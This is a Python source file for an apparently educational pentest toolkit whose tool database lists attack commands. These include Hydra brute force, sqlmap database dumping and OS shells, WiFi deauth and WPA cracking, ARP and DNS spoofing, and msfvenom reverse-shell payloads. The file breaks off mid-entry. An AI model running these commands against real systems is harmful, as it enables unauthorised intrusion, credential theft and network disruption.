#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  CyberBlack v2.0 — Advanced Cybersecurity Terminal Toolkit
#  For: SOC Analysts | Pentesters | OSINT Engineers
#  Platform: Ubuntu / Kali Linux
# ============================================================
import sys, subprocess

for _p in ['rich','psutil']:
    try: __import__(_p)
    except ImportError:
        print(f"\033[93m[*] Installing {_p}...\033[0m")
        subprocess.run([sys.executable,'-m','pip','install',_p,'-q','--break-system-packages'],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run([sys.executable,'-m','pip','install',_p,'-q'],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

import os, shutil, time, socket, platform, threading
from datetime import datetime
import psutil
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.prompt import Prompt
from rich import box
from rich.rule import Rule
from rich.align import Align
from rich.live import Live

console = Console()

RISK_COLOR = {"Low":"bright_green","Medium":"yellow","High":"red","Critical":"bold red"}

# ═══════════════════ TOOL DATABASE ═══════════════════════════════════════════

CATEGORIES = [

  {"id":"1","name":"Network Scanning","icon":"🌐","color":"cyan",
   "desc":"Discover hosts, topology, services on a network",
   "tools":[
    {"name":"Nmap","binary":"nmap",
     "tagline":"World's #1 Network Mapper & Security Auditor",
     "desc":"Industry-standard tool for host discovery, port scanning, service detection, OS fingerprinting and vulnerability scripting (NSE). Core tool for CEH Module 3, OSCP, eJPT.",
     "install":"sudo apt install nmap -y",
     "risk":"Medium",
     "syntax":"nmap [Scan Type] [Options] {target}",
     "flags":[("-sS","TCP SYN Stealth Scan (most popular)"),("-sT","TCP Connect Scan (no root)"),
               ("-sU","UDP Scan"),("-sV","Service/Version Detection"),("-sC","Default NSE Scripts"),
               ("-O","OS Detection"),("-A","Aggressive: OS+Version+Script+Trace"),
               ("-p <range>","Specify ports  e.g. -p 22,80,443  or  -p 1-1000"),
               ("-p-","Scan ALL 65535 ports"),("-T4","Fast timing template (0-5)"),
               ("--script=vuln","Run all vulnerability NSE scripts"),
               ("-oA <name>","Save output in all formats"),("-Pn","Skip host discovery"),
               ("-D RND:10","Decoy scan — mask real source IP")],
     "examples":[("Quick scan top-1000","nmap 192.168.1.1"),
                  ("Ping sweep / find live hosts","nmap -sn 192.168.1.0/24"),
                  ("Full aggressive scan","sudo nmap -A -T4 192.168.1.1"),
                  ("All 65535 ports","sudo nmap -p- -T4 192.168.1.1"),
                  ("Vulnerability scripts","sudo nmap --script=vuln 192.168.1.1"),
                  ("SMB EternalBlue check","sudo nmap --script=smb-vuln-ms17-010 -p445 192.168.1.1"),
                  ("Save all formats","sudo nmap -A -T4 -oA scan_out 192.168.1.1"),
                  ("UDP top-100","sudo nmap -sU --top-ports 100 192.168.1.1"),
                  ("Firewall evasion decoy","sudo nmap -sS -D RND:10 -f 192.168.1.1")],
     "tips":["sudo required for -sS (raw socket)","OSCP: always -p- to find hidden ports",
             "NSE scripts at /usr/share/nmap/scripts/ (600+ available)","-T4 sweet spot: fast but avoids IDS"]},

    {"name":"Masscan","binary":"masscan",
     "tagline":"Fastest Internet-Scale Port Scanner (100M pkts/sec)",
     "desc":"Scans entire IPv4 internet in under 6 minutes. Async transmission — ideal for large-scale external recon.",
     "install":"sudo apt install masscan -y","risk":"High",
     "syntax":"masscan [IP] -p [ports] --rate [n]",
     "flags":[("-p <ports>","Ports to scan"),("--rate <n>","Packets/sec (start at 1000)"),
               ("-oL <file>","List output"),("-oX <file>","XML output"),("--banners","Grab service banners"),
               ("--open-only","Show only open ports"),("--exclude <IP>","Exclude IP from scan")],
     "examples":[("All ports on one host","sudo masscan 192.168.1.1 -p0-65535"),
                  ("Subnet web ports","sudo masscan 192.168.1.0/24 -p80,443 --rate=1000"),
                  ("Multi-port fast","sudo masscan 192.168.1.0/24 -p21,22,80,443,3389 --rate=1000"),
                  ("Banner grab","sudo masscan 192.168.1.1 -p80,443 --banners --rate=100"),
                  ("XML for nmap import","sudo masscan 192.168.1.0/24 -p1-1000 --rate=1000 -oX out.xml")],
     "tips":["Always start --rate=1000, increase slowly","Masscan finds ports → nmap does deep analysis",
             "Use --exclude to avoid scanning your own IP"]},

    {"name":"Netdiscover","binary":"netdiscover",
     "tagline":"Active/Passive ARP Network Host Discovery",
     "desc":"Discovers live hosts on LAN using ARP. Works in active (sends ARP) or passive (listen only) mode.",
     "install":"sudo apt install netdiscover -y","risk":"Low",
     "syntax":"netdiscover [-i interface] [-r range] [-p passive]",
     "flags":[("-i <iface>","Interface (eth0, wlan0)"),("-r <range>","IP range to scan"),
               ("-p","Passive mode — no packets sent"),("-f","Fast mode"),("-s <ms>","Delay between packets")],
     "examples":[("Auto-detect local network","sudo netdiscover"),
                  ("Specific subnet","sudo netdiscover -r 192.168.1.0/24"),
                  ("Passive/stealth mode","sudo netdiscover -p"),
                  ("Specific interface","sudo netdiscover -i eth0 -r 10.0.0.0/8")],
     "tips":["Passive -p is completely stealth (no packets)","ARP only works on local subnet",
             "Quick LAN inventory before running nmap"]},

    {"name":"Arp-Scan","binary":"arp-scan",
     "tagline":"ARP Scanner — Finds Hosts That Block ICMP Ping",
     "desc":"Sends ARP requests to discover live hosts. Shows MAC + vendor. More reliable than ping on local networks.",
     "install":"sudo apt install arp-scan -y","risk":"Low",
     "syntax":"arp-scan [options] [range]",
     "flags":[("-l / --localnet","Scan entire local network"),("-I <iface>","Specify interface"),
               ("--retry=<n>","Retry count per host"),("--ignoredups","Ignore duplicate replies")],
     "examples":[("Scan local network","sudo arp-scan --localnet"),
                  ("Specific interface","sudo arp-scan -I eth0 --localnet"),
                  ("Find Apple devices","sudo arp-scan --localnet | grep -i apple"),
                  ("Specific subnet","sudo arp-scan 192.168.1.0/24")],
     "tips":["Vendor lookup from MAC is built-in — great for device profiling",
             "Faster than nmap ping sweep for pure LAN discovery"]},
  ]},
  {"id":"2","name":"WiFi & Wireless Attacks","icon":"📡","color":"bright_yellow",
   "desc":"Monitor mode, packet capture, WPA/WEP cracking, WPS attacks",
   "tools":[
    {"name":"Airmon-ng","binary":"airmon-ng",
     "tagline":"Enable Monitor Mode on Wireless Interface",
     "desc":"First step in any WiFi attack — puts wireless card in monitor mode to capture all nearby 802.11 frames.",
     "install":"sudo apt install aircrack-ng -y","risk":"High",
     "syntax":"airmon-ng [start|stop|check] [interface]",
     "flags":[("start <iface>","Enable monitor mode"),("stop <iface>","Disable monitor mode"),
               ("check","Check interfering processes"),("check kill","Kill interfering processes"),
               ("start <iface> <ch>","Enable on specific channel")],
     "examples":[("Kill interfering processes","sudo airmon-ng check kill"),
                  ("Start monitor on wlan0","sudo airmon-ng start wlan0"),
                  ("Verify monitor mode","iwconfig wlan0mon"),
                  ("Stop monitor mode","sudo airmon-ng stop wlan0mon"),
                  ("Full prep workflow","sudo airmon-ng check kill && sudo airmon-ng start wlan0")],
     "tips":["Always 'check kill' first to stop NetworkManager",
             "Monitor interface named wlan0mon after enabling",
             "Restore: sudo airmon-ng stop wlan0mon && sudo systemctl start NetworkManager"]},

    {"name":"Airodump-ng","binary":"airodump-ng",
     "tagline":"Capture 802.11 Frames & Grab WPA Handshakes",
     "desc":"Captures raw wireless packets. Shows nearby APs/clients. Captures the WPA 4-way handshake needed for offline cracking.",
     "install":"sudo apt install aircrack-ng -y","risk":"High",
     "syntax":"airodump-ng [options] <monitor_interface>",
     "flags":[("--bssid <MAC>","Filter to specific AP"),("-c <ch>","Lock to channel"),
               ("-w <prefix>","Write capture to files"),("--wps","Show WPS info"),
               ("--band <a/bg/abg>","Frequency band to scan")],
     "examples":[("Scan all nearby WiFi","sudo airodump-ng wlan0mon"),
                  ("Lock to channel 6","sudo airodump-ng -c 6 wlan0mon"),
                  ("Capture handshake (targeted)","sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon"),
                  ("Show WPS APs","sudo airodump-ng --wps wlan0mon"),
                  ("5GHz band scan","sudo airodump-ng --band a wlan0mon")],
     "tips":["Watch top-right for 'WPA handshake: XX:XX:XX:XX'",
             "Run aireplay-ng deauth alongside to force handshake",
             ".cap file feeds into aircrack-ng or hashcat"]},

    {"name":"Aireplay-ng","binary":"aireplay-ng",
     "tagline":"Wireless Packet Injection & Deauthentication Attack",
     "desc":"Injects frames into wireless network. Deauth attack forces clients to reconnect — triggering WPA handshake capture.",
     "install":"sudo apt install aircrack-ng -y","risk":"Critical",
     "syntax":"aireplay-ng [attack] -a <BSSID> <interface>",
     "flags":[("-0 <n>","Deauth attack (0 = continuous)"),("-1 <delay>","Fake authentication"),
               ("-3","ARP replay (WEP)"),("-9","Injection test"),
               ("-a <BSSID>","AP MAC address"),("-c <client>","Target client MAC")],
     "examples":[("Test injection capability","sudo aireplay-ng -9 wlan0mon"),
                  ("Deauth all clients (5 pkts)","sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon"),
                  ("Deauth specific client","sudo aireplay-ng -0 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon"),
                  ("Continuous deauth (handshake)","sudo aireplay-ng -0 0 -a <BSSID> wlan0mon")],
     "tips":["Run WHILE airodump-ng is capturing","-0 5 is less disruptive than -0 0 (infinite)",
             "Must be on same channel as target AP"]},

    {"name":"Aircrack-ng","binary":"aircrack-ng",
     "tagline":"WEP & WPA/WPA2 PSK Key Cracker",
     "desc":"Offline cracker for WEP keys and WPA/WPA2 PSK using dictionary attack on captured handshakes.",
     "install":"sudo apt install aircrack-ng -y","risk":"High",
     "syntax":"aircrack-ng [options] <capture.cap>",
     "flags":[("-w <wordlist>","Wordlist for WPA attack"),("-b <BSSID>","Target AP MAC"),
               ("-e <SSID>","Target network name"),("-J <file>","Export to hashcat hccapx format")],
     "examples":[("WPA crack with rockyou","aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture.cap"),
                  ("Target by SSID","aircrack-ng -w /usr/share/wordlists/rockyou.txt -e 'NetworkName' capture.cap"),
                  ("Export to hashcat","aircrack-ng -J hashcat_input capture.cap"),
                  ("WEP crack","aircrack-ng -b <BSSID> capture.cap")],
     "tips":["For GPU cracking: convert to hccapx → hashcat -m 2500 hash.hccapx wordlist.txt",
             "rockyou.txt: gunzip /usr/share/wordlists/rockyou.txt.gz",
             "FULL FLOW: airmon-ng → airodump-ng → aireplay-ng → aircrack-ng"]},
               ]},

  {"id":"3","name":"Password & Hash Attacks","icon":"🔑","color":"red",
   "desc":"Brute force, dictionary attacks, hash cracking, wordlist generation",
   "tools":[
    {"name":"Hydra","binary":"hydra",
     "tagline":"Fast Network Login Cracker — 50+ Protocols",
     "desc":"Fastest online password cracker. Supports SSH, FTP, HTTP, SMB, RDP, MySQL, SMTP, and 50+ more protocols.",
     "install":"sudo apt install hydra -y","risk":"High",
     "syntax":"hydra [options] target protocol",
     "flags":[("-l <user>","Single username"),("-L <file>","Username list"),
               ("-p <pass>","Single password"),("-P <file>","Password list"),
               ("-t <n>","Parallel tasks (default 16)"),("-s <port>","Custom port"),
               ("-f","Stop after first success"),("-V","Show each attempt"),("-o <file>","Output file")],
     "examples":[("SSH brute force","hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh"),
                  ("FTP with user list","hydra -L users.txt -P wordlist.txt 192.168.1.1 ftp"),
                  ("HTTP POST form","hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"),
                  ("RDP attack","hydra -l administrator -P wordlist.txt 192.168.1.1 rdp"),
                  ("MySQL","hydra -l root -P wordlist.txt 192.168.1.1 mysql"),
                  ("Custom port SSH","hydra -l root -P wordlist.txt -s 2222 192.168.1.1 ssh")],
     "tips":["Use -t 4 for SSH — higher causes connection resets",
             "Inspect HTTP login in Burp Suite first to get correct POST format",
             "Try default creds before launching full wordlist attacks"]},

    {"name":"John the Ripper","binary":"john",
     "tagline":"Offline Password Hash Cracker",
     "desc":"Most popular offline hash cracker. Auto-detects hash types. Supports NTLM, MD5, SHA, Linux shadow, ZIP, SSH keys, and hundreds more.",
     "install":"sudo apt install john -y","risk":"Medium",
     "syntax":"john [options] [hashfile]",
     "flags":[("--wordlist=<file>","Wordlist attack"),("--rules","Apply mangling rules"),
               ("--format=<type>","Force hash format"),("--show","Show cracked passwords"),
               ("--incremental","Brute force mode"),("--fork=<n>","Use N CPU cores"),("--list=formats","List all formats")],
     "examples":[("Crack with rockyou","john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"),
                  ("Linux shadow file","john --wordlist=wordlist.txt /etc/shadow"),
                  ("NTLM hashes","john --format=NT --wordlist=wordlist.txt hashes.txt"),
                  ("Crack ZIP password","zip2john archive.zip > zip.hash && john zip.hash"),
                  ("Crack SSH key","ssh2john id_rsa > rsa.hash && john rsa.hash"),
                  ("Show cracked","john --show hashes.txt")],
     "tips":["zip2john, ssh2john, pdf2john convert non-standard formats",
             "unshadow /etc/passwd /etc/shadow > combined.txt for Linux cracking",
             "For GPU cracking use hashcat — john is CPU-only"]},

    {"name":"Hashcat","binary":"hashcat",
     "tagline":"World's Fastest GPU Password Cracker",
     "desc":"GPU-accelerated hash cracker. Supports 300+ hash types. 100x-1000x faster than CPU-only tools for same hash type.",
     "install":"sudo apt install hashcat -y","risk":"Medium",
     "syntax":"hashcat -m <type> -a <mode> hashfile wordlist",
     "flags":[("-m <type>","Hash type ID"),("-a <mode>","Attack mode: 0=dict, 3=brute, 6=hybrid"),
               ("-r <rules>","Rule file"),("-o <file>","Output cracked hashes"),("--show","Show cracked"),
               ("--force","Force on VM/no GPU"),("-w <1-4>","Workload 1=low 4=max")],
     "examples":[("Crack MD5","hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt"),
                  ("Crack NTLM (Windows)","hashcat -m 1000 -a 0 ntlm.txt rockyou.txt"),
                  ("Crack WPA2 handshake","hashcat -m 22000 -a 0 capture.hc22000 rockyou.txt"),
                  ("Crack SHA-256","hashcat -m 1400 -a 0 sha256.txt rockyou.txt"),
                  ("Brute force 6-char","hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a"),
                  ("With best64 rules","hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule hash.txt rockyou.txt")],
     "tips":["Hash IDs: 0=MD5, 100=SHA1, 1000=NTLM, 1400=SHA256, 1800=SHA512crypt, 22000=WPA2",
             "Mask: ?l=lower, ?u=upper, ?d=digit, ?s=symbol, ?a=all",
             "--force needed in VMs where no GPU detected"]},

    
      ]},


  {"id":"4","name":"Web Application Testing","icon":"🕷️","color":"bright_magenta",
   "desc":"SQLi, XSS, directory busting, fuzzing, WAF detection, fingerprinting",
   "tools":[
    {"name":"SQLmap","binary":"sqlmap",
     "tagline":"Automatic SQL Injection & Database Takeover",
     "desc":"World's most powerful automated SQL injection tool. Detects and exploits SQLi, dumps DBs, reads files, executes OS commands.",
     "install":"sudo apt install sqlmap -y","risk":"Critical",
     "syntax":"sqlmap [options] -u '<target URL>'",
     "flags":[("-u <url>","Target URL with parameter"),("-r <file>","Burp Suite request file"),
               ("--dbs","List all databases"),("-D <db> --tables","List tables in DB"),
               ("-D <db> -T <tbl> --dump","Dump table data"),("--batch","Auto-confirm all prompts"),
               ("--level=5 --risk=3","Maximum depth testing"),("--tamper=<script>","WAF bypass script"),
               ("--os-shell","Get OS command shell via SQLi"),("--random-agent","Randomize User-Agent")],
     "examples":[("Test GET parameter","sqlmap -u 'http://target.com/page.php?id=1'"),
                  ("Test POST with Burp file","sqlmap -r burp_request.txt"),
                  ("List databases","sqlmap -u 'http://target.com/?id=1' --dbs"),
                  ("Dump users table","sqlmap -u 'http://target.com/?id=1' -D mydb -T users --dump"),
                  ("OS shell via SQLi","sqlmap -u 'http://target.com/?id=1' --os-shell"),
                  ("WAF bypass","sqlmap -u 'http://target.com/?id=1' --tamper=between,randomcase --random-agent"),
                  ("With session cookie","sqlmap -u 'http://target.com/?id=1' --cookie='PHPSESSID=abc'")],
     "tips":["Always use --random-agent to bypass User-Agent WAF blocks",
             "Use -r with Burp captured requests for accurate POST testing",
             "--tamper=space2comment bypasses many basic WAFs"]},

    {"name":"Nikto","binary":"nikto",
     "tagline":"Web Server Vulnerability Scanner (6700+ Tests)",
     "desc":"Scans web servers for dangerous files, outdated versions, misconfigurations. Tests 6700+ potential vulnerabilities.",
     "install":"sudo apt install nikto -y","risk":"Medium",
     "syntax":"nikto -h <host> [options]",
     "flags":[("-h <host>","Target host/URL"),("-p <port>","Port"),("-ssl","Force HTTPS"),
               ("-o <file>","Output file"),("-Format html","HTML report"),("-C all","Check all CGI dirs"),
               ("-id <user:pass>","Basic auth credentials")],
     "examples":[("Basic scan","nikto -h http://192.168.1.1"),
                  ("HTTPS scan","nikto -h https://192.168.1.1 -ssl"),
                  ("Custom port","nikto -h 192.168.1.1 -p 8080"),
                  ("HTML report","nikto -h http://target.com -o report.html -Format html"),
                  ("Through Burp proxy","nikto -h http://target.com -useproxy http://127.0.0.1:8080")],
     "tips":["Very LOUD — always detectable by IDS/WAF","Good for quick high-level web overview",
             "High false positive rate — manual verification needed"]},

    {"name":"Gobuster","binary":"gobuster",
     "tagline":"Directory, File & DNS Brute Forcer (Go, Fast)",
     "desc":"Fast directory/DNS brute forcer written in Go. Finds hidden admin panels, backup files, APIs, upload dirs.",
     "install":"sudo apt install gobuster -y","risk":"Medium",
     "syntax":"gobuster dir -u <url> -w <wordlist> [options]",
     "flags":[("dir","Directory/file brute force mode"),("dns","DNS subdomain mode"),
               ("-u <url>","Target URL"),("-w <wordlist>","Wordlist file"),
               ("-x <exts>","File extensions: php,html,txt,bak"),("-t <n>","Threads"),
               ("-o <file>","Output file"),("-k","Skip TLS verification")],
     "examples":[("Directory scan","gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt"),
                  ("With PHP extension","gobuster dir -u http://target.com -w common.txt -x php,html,txt"),
                  ("Fast with 50 threads","gobuster dir -u http://target.com -w big.txt -t 50"),
                  ("DNS subdomain","gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
                  ("With auth cookie","gobuster dir -u http://target.com -w common.txt -c 'PHPSESSID=abc'")],
     "tips":["SecLists: git clone https://github.com/danielmiessler/SecLists",
             "Best combo: -x php,html,txt,bak,old,zip for file hunting",
             "-t 50-100 for local; lower for internet targets"]},

 
    {"name":"WafW00f","binary":"wafw00f",
     "tagline":"WAF Detection — Identify Firewall Before Attacking",
     "desc":"Detects 150+ WAF products: Cloudflare, ModSecurity, AWS WAF, Imperva, F5 BIG-IP, Sucuri and more.",
     "install":"sudo apt install wafw00f -y","risk":"Low",
     "syntax":"wafw00f [options] <url>",
     "flags":[("-a","Check all WAFs, don't stop at first detect"),("-v","Verbose"),
               ("-o <file>","Output file"),("-f json","JSON format")],
     "examples":[("Detect WAF","wafw00f http://target.com"),
                  ("Check all possible WAFs","wafw00f -a http://target.com"),
                  ("Verbose","wafw00f -v http://target.com"),
                  ("JSON output","wafw00f -o result.json -f json http://target.com")],
     "tips":["Always run BEFORE active scanning — know your adversary",
             "Cloudflare → sqlmap --tamper=charunicodeescape",
             "ModSecurity → sqlmap --tamper=randomcase,space2comment"]},

    {"name":"WhatWeb","binary":"whatweb",
     "tagline":"Web Technology Fingerprinting (1800+ Plugins)",
     "desc":"Identifies CMS, web servers, JS libraries, analytics, versions. Detects WordPress, Joomla, Drupal, Apache, Nginx, IIS and more.",
     "install":"sudo apt install whatweb -y","risk":"Low",
     "syntax":"whatweb [options] <target>",
     "flags":[("-v","Verbose output"),("-a <1-4>","Aggression level (1=stealth, 4=heavy)"),
               ("-o <file>","Log results"),("--log-json","JSON output")],
     "examples":[("Fingerprint site","whatweb http://target.com"),
                  ("Verbose","whatweb -v http://target.com"),
                  ("Aggressive","whatweb -a 3 http://target.com"),
                  ("Scan IP range","whatweb 192.168.1.0/24"),
                  ("JSON output","whatweb --log-json=results.json http://target.com")],
     "tips":["WordPress version detected → map to known CVEs",
             "Level 1 = stealthy, level 4 = aggressive (many requests)"]},
   ]},

  {"id":"5","name":"Exploitation Frameworks","icon":"💣","color":"bold red",
   "desc":"Metasploit, ExploitDB, BeEF, Social Engineering, Router exploitation",
   "tools":[
    {"name":"Metasploit Framework","binary":"msfconsole",
     "tagline":"World's Most Used Penetration Testing Framework",
     "desc":"2000+ exploits, 900+ payloads, post-exploitation modules. Core tool for OSCP, CEH, eJPT, and professional red teams.",
     "install":"csnap install metasploit-framework","risk":"Critical",
     "syntax":"msfconsole  (interactive console)",
     "flags":[("search <term>","Search exploits by name/CVE/platform"),("use <module>","Select a module"),
               ("info","Show module info and options"),("show options","Display required options"),
               ("set <OPT> <val>","Set module option"),("setg <OPT> <val>","Set globally for all modules"),
               ("run / exploit","Execute the module"),("sessions -i <n>","Interact with session n"),
               ("db_nmap <opts>","Run nmap and save to MSF database"),("msfvenom","Generate standalone payloads")],
     "examples":[("Start with DB","sudo msfdb init && sudo msfconsole"),
                  ("Search EternalBlue","search eternalblue"),
                  ("Use MS17-010","use exploit/windows/smb/ms17_010_eternalblue"),
                  ("Set target and run","set RHOSTS 192.168.1.1\nset LHOST 192.168.1.10\nrun"),
                  ("Multi-handler","use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.10\nrun"),
                  ("msfvenom Windows shell","msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe"),
                  ("msfvenom Linux shell","msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf"),
                  ("Meterpreter dump hashes","# In meterpreter session:\nrun post/windows/gather/hashdump")],
     "tips":["setg LHOST <your_IP> globally so you don't repeat it",
             "rank: Excellent > Great > Good — prioritize higher ranked",
             "Meterpreter: sysinfo, getuid, getsystem, hashdump, shell, download, upload"]},


  ]},
    

    
  {"id":"6","name":"OSINT & Reconnaissance","icon":"🔍","color":"bright_blue",
   "desc":"Email harvesting, subdomain discovery, DNS recon, social media OSINT",
   "tools":[
  
    {"name":"Amass","binary":"amass",
     "tagline":"In-Depth Attack Surface Mapping — 50+ OSINT Sources",
     "desc":"Most comprehensive subdomain enumeration tool. Uses 50+ sources: Shodan, VirusTotal, CertSpotter, SecurityTrails, DNS brute force.",
     "install":"sudo apt install amass -y 2>/dev/null || sudo snap install amass","risk":"Low",
     "syntax":"amass enum -d <domain> [options]",
     "flags":[("enum -d <domain>","Passive subdomain enum"),("enum -active -d","Active enumeration"),
               ("enum -brute -d","Brute force subdomains"),("-ip","Show IP addresses"),
               ("-o <file>","Output to file"),("-json <file>","JSON output")],
     "examples":[("Passive enum","amass enum -d target.com"),
                  ("With IPs","amass enum -d target.com -ip"),
                  ("Active + brute","amass enum -active -brute -d target.com"),
                  ("Save results","amass enum -d target.com -o amass.txt"),
                  ("Network visualization","amass viz -d3 -d target.com -o network.html")],
     "tips":["Configure API keys at ~/.config/amass/config.ini for 10x results",
             "Passive mode — no direct contact with target",
             "D3 visualization creates beautiful attack surface maps"]},

    {"name":"Subfinder","binary":"subfinder",
     "tagline":"Fast Passive Subdomain Discovery",
     "desc":"Discovers subdomains using passive OSINT sources: crt.sh, CertSpotter, VirusTotal, SecurityTrails and more.",
     "install":"sudo apt install subfinder -y 2>/dev/null || sudo snap install subfinder 2>/dev/null || (sudo apt install -y golang-go && go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && sudo cp ~/go/bin/subfinder /usr/local/bin/)","risk":"Low",
     "syntax":"subfinder -d <domain> [options]",
     "flags":[("-d <domain>","Target domain"),("-dL <file>","Domain list"),("-o <file>","Output file"),
               ("-silent","Results only"),("-all","All sources including slow ones")],
     "examples":[("Basic enum","subfinder -d target.com"),
                  ("Silent (results only)","subfinder -d target.com -silent"),
                  ("Multiple domains","subfinder -dL domains.txt -o subs.txt"),
                  ("Pipe to nmap","subfinder -d target.com -silent | xargs -I{} nmap -T4 -F {}")],
     "tips":["Configure API keys at ~/.config/subfinder/provider-config.yaml",
             "Faster than amass for pure passive subdomain discovery",
             "Pipe to httpx to check which subdomains are live"]},

    {"name":"Sherlock","binary":"sherlock",
     "tagline":"Social Media Username Hunt — 400+ Platforms",
     "desc":"Finds social media accounts across 400+ platforms by username. Twitter, Reddit, GitHub, Instagram, LinkedIn, TikTok, and more.",
     "install":"sudo apt install sherlock","risk":"Low",
     "syntax":"sherlock <username> [options]",
     "flags":[("--print-found","Show only found accounts"),("--output <file>","Save output"),
               ("--csv","CSV output"),("--browse","Open links in browser"),("--tor","Route through Tor")],
     "examples":[("Basic search","sherlock johndoe"),
                  ("Multiple usernames","sherlock johndoe john.doe john_doe"),
                  ("Save results","sherlock johndoe --output results.txt"),
                  ("CSV export","sherlock johndoe --csv"),
                  ("Via Tor","sherlock johndoe --tor")],
     "tips":["GitHub often reveals real name, location, employer",
             "Cross-reference accounts to build comprehensive target profile",
             "Use --tor to protect your identity during investigations"]},

     ]},
    

  {"id":"7","name":"Packet Analysis & MITM","icon":"📦","color":"magenta",
   "desc":"Packet capture, traffic analysis, ARP spoofing, man-in-the-middle attacks",
   "tools":[
    {"name":"Wireshark","binary":"wireshark",
     "tagline":"#1 Network Protocol Analyzer (GUI)",
     "desc":"World's foremost packet analyzer. Captures and inspects every packet at deepest level. Used by SOC analysts, network engineers, and pentesters.",
     "install":"sudo apt install wireshark -y && sudo usermod -aG wireshark $USER","risk":"Low",
     "syntax":"wireshark  or  sudo wireshark -i eth0 -k",
     "flags":[("-i <iface>","Capture interface"),("-r <file>","Read pcap file"),("-k","Start capture immediately"),
               ("-f <filter>","BPF capture filter"),("-w <file>","Write to file")],
     "examples":[("Open GUI","wireshark"),
                  ("Capture on eth0","sudo wireshark -i eth0 -k"),
                  ("Open pcap file","wireshark -r capture.pcap"),
                  ("Filter: HTTP only","# Display filter bar: http"),
                  ("Filter: specific IP","# ip.addr == 192.168.1.1"),
                  ("Filter: POST requests","# http.request.method == POST"),
                  ("Follow TCP stream","# Right-click packet → Follow → TCP Stream"),
                  ("Export HTTP objects","# File → Export Objects → HTTP")],
     "tips":["Key filters: http, dns, ftp, smtp, arp, tcp, udp, icmp",
             "Ctrl+F: find text in packets — search 'password'",
             "Statistics → Protocol Hierarchy for quick traffic overview",
             "Add to wireshark group: sudo usermod -aG wireshark $USER then re-login"]},

   
    {"name":"Tcpdump","binary":"tcpdump",
     "tagline":"Classic Command-Line Packet Sniffer",
     "desc":"Pre-installed on almost every Unix/Linux system. Captures to .pcap files compatible with Wireshark. The go-to on remote/headless systems.",
     "install":"sudo apt install tcpdump -y","risk":"Low",
     "syntax":"tcpdump [options] [filter expression]",
     "flags":[("-i <iface>","Interface (-i any = all interfaces)"),("-w <file>","Write to pcap"),
               ("-r <file>","Read pcap"),("-n / -nn","No DNS/port resolution"),("-A","Print as ASCII"),
               ("-X","Print hex + ASCII"),("-c <n>","Capture n packets then exit"),("-s 0","Full packet capture")],
     "examples":[("Capture all traffic","sudo tcpdump -i eth0"),
                  ("Capture to file","sudo tcpdump -i eth0 -w capture.pcap"),
                  ("HTTP traffic","sudo tcpdump -i eth0 -nn port 80 or port 443"),
                  ("Specific host","sudo tcpdump -i eth0 host 192.168.1.100"),
                  ("Capture with ASCII content","sudo tcpdump -i eth0 -A -nn port 80"),
                  ("Find plaintext credentials","sudo tcpdump -i eth0 -A -s 0 port 80 | grep -i 'password\\|user'"),
                  ("TCP SYN packets only","sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'")],
     "tips":["BPF filter syntax: host, net, port, src, dst, tcp, udp, and, or, not",
             "-w saves pcap → open in Wireshark for GUI analysis",
             "Use -s 0 to capture full packets (no truncation)"]},

    {"name":"Ettercap","binary":"ettercap",
     "tagline":"Comprehensive MITM Attack Suite",
     "desc":"Man-in-the-middle attack suite. ARP poisoning, DNS spoofing, plugin-based attacks. The classic MITM tool.",
     "install":"sudo apt install ettercap-text-only -y","risk":"Critical",
     "syntax":"ettercap -T -q -M arp:remote /target1// /gateway//",
     "flags":[("-T","Text-only interface"),("-G","GTK GUI interface"),("-q","Quiet mode"),
               ("-i <iface>","Interface"),("-M arp:remote","ARP MITM mode"),("-P <plugin>","Load plugin")],
     "examples":[("MITM host ↔ gateway","sudo ettercap -T -q -M arp:remote /192.168.1.100// /192.168.1.1//"),
                  ("MITM all hosts","sudo ettercap -T -q -M arp /192.168.1.0/24//"),
                  ("DNS spoofing","sudo ettercap -T -q -M arp -P dns_spoof /192.168.1.0/24//"),
                  ("Passive only","sudo ettercap -T -q -i eth0 -p"),
                  ("GUI mode","sudo ettercap -G")],
     "tips":["Enable IP forwarding first: echo 1 > /proc/sys/net/ipv4/ip_forward",
             "MITM attacks are ILLEGAL without permission — lab only!",
             "Bettercap is the modern successor with better performance"]},

    {"name":"Bettercap","binary":"bettercap",
     "tagline":"Modern Network Attack Framework — MITM, WiFi, BLE",
     "desc":"Modern replacement for ettercap. Modular framework for MITM, WiFi deauth, BLE enumeration, HTTP/HTTPS sniffing.",
     "install":"sudo apt install bettercap -y 2>/dev/null || (sudo apt install -y golang-go libpcap-dev && go install github.com/bettercap/bettercap@latest && sudo cp ~/go/bin/bettercap /usr/local/bin/)","risk":"Critical",
     "syntax":"bettercap -iface <interface>  (then interactive commands)",
     "flags":[("-iface <iface>","Network interface"),("-caplet <file>","Run from caplet script"),
               ("net.probe on","Probe network for active hosts"),("arp.spoof on","Enable ARP spoofing"),
               ("net.sniff on","Enable packet sniffing"),("dns.spoof on","Enable DNS spoofing"),
               ("wifi.recon on","WiFi reconnaissance"),("wifi.deauth <mac>","Deauth WiFi client")],
     "examples":[("Start bettercap","sudo bettercap -iface eth0"),
